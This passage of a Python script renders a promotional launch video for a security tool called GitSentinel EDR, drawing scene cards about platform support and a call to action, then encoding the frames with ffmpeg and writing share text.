                      {"prefix": "[VECTOR]", "text": "Background script silently changes git config user.email to attacker identity.", "color": COLOR_DANGER},
                      {"prefix": "[INJECTION]", "text": "Creates stealth branch, commits backdoored code, and issues 'gh pr create'.", "color": COLOR_WARNING},
                      {"prefix": "[DEFENSE]", "text": "GitSentinel verifies interactive TTY session and GPG signing integrity.", "color": COLOR_SUCCESS},
                      {"prefix": "[VERDICT]", "text": "Headless Git commits blocked; rogue PR aborted before GitHub sync.", "color": COLOR_ACCENT}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="GIT PR INTEGRITY")

    # =========================================================================
    # SCENE 7: UNIVERSAL CROSS-PLATFORM (50.0s - 58.0s, Frames 1500 - 1740)
    # =========================================================================
    elif sec < 58.0:
        draw_header_footer(draw, frame_idx, 7, "Cross-Platform // Universal Architecture")
        
        draw.text((100, 115), "ONE UNIFIED ENGINE. COMPATIBLE ACROSS EVERY DEVICE.", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Zero kernel extensions. Pure user-space daemon with native GUI and remote PWA.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        card_w = 390
        gap = 23
        start_x = (WIDTH - (4 * card_w + 3 * gap)) // 2
        
        draw_card(draw, start_x, 220, card_w, 660,
                  title="macOS",
                  subtitle="Native .app bundle",
                  items=[
                      {"prefix": "•", "text": "Apple Silicon & Intel", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "EndpointSecurity API", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Native pywebview GUI", "color": COLOR_ACCENT},
                      {"prefix": "•", "text": "Menu bar daemon", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="MACOS NATIVE")
                  
        draw_card(draw, start_x + card_w + gap, 220, card_w, 660,
                  title="WINDOWS",
                  subtitle="run_app.bat & Service",
                  items=[
                      {"prefix": "•", "text": "Windows 10 / 11 / Server", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Sysmon & ETW integration", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "VSS shadow protection", "color": COLOR_ACCENT},
                      {"prefix": "•", "text": "1-click batch launcher", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="WINDOWS NATIVE")
                  
        draw_card(draw, start_x + 2 * (card_w + gap), 220, card_w, 660,
                  title="LINUX",
                  subtitle="Systemd Service",
                  items=[
                      {"prefix": "•", "text": "Ubuntu, Debian, Fedora, Arch", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "eBPF tracepoint hooks", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Auditd / journald scanner", "color": COLOR_ACCENT},
                      {"prefix": "•", "text": "Headless CLI & daemon", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="LINUX DAEMON")
                  
        draw_card(draw, start_x + 3 * (card_w + gap), 220, card_w, 660,
                  title="MOBILE & WEB",
                  subtitle="PWA & Remote GUI",
                  items=[
                      {"prefix": "•", "text": "iOS & Android PWA app", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Full responsive Web UI", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Remote fleet dashboard", "color": COLOR_ACCENT},
                      {"prefix": "•", "text": "Offline manifest caching", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="PWA / WEB")
                  
        draw.rounded_rectangle((start_x, 900, WIDTH - start_x, 980), radius=14, fill=(16, 26, 46), outline=COLOR_ACCENT, width=1)
        draw.text((start_x + 40, 928), "BENCHMARKS: < 0.4% CPU CONSUMPTION • 18MB RAM • ZERO KERNEL PANICS • 100% AUDITABLE SOURCE", font=FONT_MONO_BOLD, fill=COLOR_TEXT_MAIN)

    # =========================================================================
    # SCENE 8: GRAND OUTRO // CALL TO ACTION (58.0s - 64.0s, Frames 1740 - 1920)
    # =========================================================================
    else:
        fade_factor = 1.0
        if sec > 62.5:
            fade_factor = max(0.0, (64.0 - sec) / 1.5)
            
        draw_header_footer(draw, frame_idx, 8, "Deploy // Get Started")
        
        draw_centered_text(draw, 170, "GITSENTINEL EDR 2.0", FONT_HERO, COLOR_TEXT_MAIN)
        draw_centered_text(draw, 245, "THE BEHAVIORAL THREAT MATRIX FOR DEVELOPERS & SECURITY RESEARCHERS", FONT_SUBTITLE, COLOR_ACCENT)
        
        center_w = 1100
        center_x = (WIDTH - center_w) // 2
        draw_card(draw, center_x, 310, center_w, 560,
                  title="READY FOR DEPLOYMENT ACROSS YOUR ENTIRE INFRASTRUCTURE",
                  subtitle="Free, open source, and verifiable. Protect your code, workstations, and AI pipelines today.",
                  items=[
                      {"prefix": "[DOWNLOAD]", "text": "Download the native app bundle for macOS, Windows, and Linux.", "color": COLOR_TEXT_MAIN},
                      {"prefix": "[WEB GUI]", "text": "Open the live web GUI dashboard in your browser instantly.", "color": COLOR_TEXT_MAIN},
                      {"prefix": "[SOURCE]", "text": "Inspect the complete source code on GitHub: https://github.com/vatsal-ag/GitSentinel", "color": COLOR_ACCENT, "mono": True},
                      {"prefix": "[PRIVACY]", "text": "Zero telemetry leaves your machine. Absolute privacy and local behavioral sovereignty.", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_SUCCESS,
                  badge_text="OFFICIAL LAUNCH v2.0")
                  
        draw_centered_text(draw, 910, "JOIN THE SENTINEL NETWORK • GITSENTINEL.IO", FONT_MONO_BOLD, COLOR_TEXT_SUB)
        
        if fade_factor < 1.0:
            overlay = Image.new("RGBA", (WIDTH, HEIGHT), (8, 12, 20, int(255 * (1.0 - fade_factor))))
            frame.paste(Image.alpha_composite(frame.convert("RGBA"), overlay).convert("RGB"))

    return frame


# ---------------------------------------------------------------------------
# 4. MAIN EXECUTION PIPELINE
# ---------------------------------------------------------------------------
def main():
    print("==================================================================")
    print(" GITSENTINEL EDR 2.0 — HIGH-ENERGY LAUNCH VIDEO RENDERER")
    print(f" Target: {WIDTH}x{HEIGHT} @ {FPS}fps, Duration: {DURATION_SEC}s ({TOTAL_FRAMES} frames)")
    print("==================================================================")
    
    # 1. Synthesize Soundtrack
    soundtrack_wav = generate_soundtrack()
    
    # 2. Pre-render Static Base Canvas (Background defense grid)
    print("[*] Generating high-precision defense grid base canvas...")
    base_canvas = Image.new("RGB", (WIDTH, HEIGHT), COLOR_BG)
    draw_base = ImageDraw.Draw(base_canvas)
    
    # Grid lines every 64px
    for x in range(0, WIDTH, 64):
        draw_base.line([(x, 0), (x, HEIGHT)], fill=COLOR_GRID, width=1)
    for y in range(0, HEIGHT, 64):
        draw_base.line([(0, y), (WIDTH, y)], fill=COLOR_GRID, width=1)
        
    # 3. Setup ffmpeg pipe
    mp4_path = os.path.join(OUTPUT_DIR, "brag.mp4")
    poster_jpg = os.path.join(OUTPUT_DIR, "brag.jpg")
    
    ffmpeg_cmd = [
        FFMPEG_BIN,
        "-y",
        "-f", "rawvideo",
        "-vcodec", "rawvideo",
        "-s", f"{WIDTH}x{HEIGHT}",
        "-pix_fmt", "rgb24",
        "-r", str(FPS),
        "-i", "-",                       # Frame input from stdin
        "-i", soundtrack_wav,            # Synthesized audio
        "-c:v", "libx264",
        "-preset", "veryfast",
        "-crf", "18",
        "-pix_fmt", "yuv420p",
        "-c:a", "aac",
        "-b:a", "192k",
        "-shortest",
        mp4_path
    ]
    
    print(f"[*] Spawning ffmpeg pipeline -> {mp4_path}")
    proc = subprocess.Popen(ffmpeg_cmd, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    
    t0 = time.time()
    poster_saved = False
    
    for f in range(TOTAL_FRAMES):
        frame = render_frame(f, base_canvas)
        
        # Extract pristine poster image at frame 600 (Hero reveal settled frame)
        if f == 600 and not poster_saved:
            frame.save(poster_jpg, quality=95)
            poster_saved = True
            print(f"[✓] Captured high-resolution settled poster image -> {poster_jpg}")
            
        # Pipe RGB bytes directly to ffmpeg
        proc.stdin.write(frame.tobytes())
        
        if f % 150 == 0 or f == TOTAL_FRAMES - 1:
            elapsed = time.time() - t0
            fps_render = (f + 1) / max(elapsed, 0.001)
            eta = (TOTAL_FRAMES - (f + 1)) / max(fps_render, 0.001)
            print(f"  -> Rendered frame {f+1:4d} / {TOTAL_FRAMES} ({((f+1)/TOTAL_FRAMES)*100:5.1f}%) | "
                  f"Speed: {fps_render:5.1f} fps | Elapsed: {elapsed:4.1f}s | ETA: {eta:4.1f}s")
                  
    proc.stdin.close()
    proc.wait()
    stderr_data = proc.stderr.read()
    
    if proc.returncode != 0:
        print("[!] FFmpeg error during encoding:")
        print(stderr_data.decode("utf-8", errors="ignore"))
        sys.exit(1)
        
    render_time = time.time() - t0
    file_size_mb = os.path.getsize(mp4_path) / (1024 * 1024)
    print("==================================================================")
    print(f"[✓] Launch Video Rendered Successfully in {render_time:.2f}s!")
    print(f"    File: {mp4_path} ({file_size_mb:.2f} MB, {DURATION_SEC}s, 30fps, 1080p)")
    print("==================================================================")
    
    # 4. Copy deliverables to web static folder and root for Vercel
    static_mp4 = os.path.join(STATIC_DIR, "brag.mp4")
    static_jpg = os.path.join(STATIC_DIR, "brag.jpg")
    root_mp4 = os.path.join(PROJECT_ROOT, "brag.mp4")
    root_jpg = os.path.join(PROJECT_ROOT, "brag.jpg")
    
    import shutil
    shutil.copyfile(mp4_path, static_mp4)
    shutil.copyfile(poster_jpg, static_jpg)
    shutil.copyfile(mp4_path, root_mp4)
    shutil.copyfile(poster_jpg, root_jpg)
    print(f"[✓] Synced video & poster to web static: {static_mp4}")
    print(f"[✓] Synced video & poster to project root: {root_mp4}")
    
    # 5. Write Share Copy
    share_path = os.path.join(OUTPUT_DIR, "share-copy.txt")
    share_text = (
        "Introducing GitSentinel EDR 2.0 🛡️\n\n"
        "The first universal behavioral endpoint detection & response system built for the AI & supply-chain era. "
        "Catches autonomous AI sandbox breakouts, WannaCry ransomware mutations, 'CTRL' movie-style surveillance spyware, "
        "and unauthorized Git PR tampering before drives lock or credentials leak.\n\n"
        "Zero kernel drivers. Compatible with macOS, Windows, Linux, iOS & Android.\n\n"
        "Watch the 64s launch trailer & test the live simulator:\n"
        "https://github.com/vatsal-ag/GitSentinel\n"
    )
    with open(share_path, "w") as sf:
        sf.write(share_text)
    print(f"[✓] Share copy written to {share_path}")

if __name__ == "__main__":
    main()
